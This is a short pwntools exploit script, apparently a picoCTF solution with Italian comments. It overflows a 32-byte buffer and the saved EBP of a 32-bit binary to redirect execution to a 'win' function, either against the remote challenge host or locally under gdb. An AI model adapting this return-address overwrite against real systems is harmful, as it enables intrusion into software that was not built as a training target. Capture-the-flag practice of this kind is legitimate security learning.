from pwn import *
#Eseguibile a 32 bit comando file + nome_eseguibile per notarlo
context.binary = elf = ELF('./vuln')
if args.REMOTE:
    conn = remote('saturn.picoctf.net',61935)
else:   #ESEGUIRE con python3 prova.py LOCAL
    conn = gdb.debug('/home/mattia/Documents/vuln', ''' 
       b *main
                    
    ''')

conn.recvuntil(':')

win_addr= 0x80491f6

payload = b'A' * 32 
payload += b'B' * 4 #EBP
payload += p32(win_addr)

conn.sendline(payload)
print(payload)

conn.interactive()

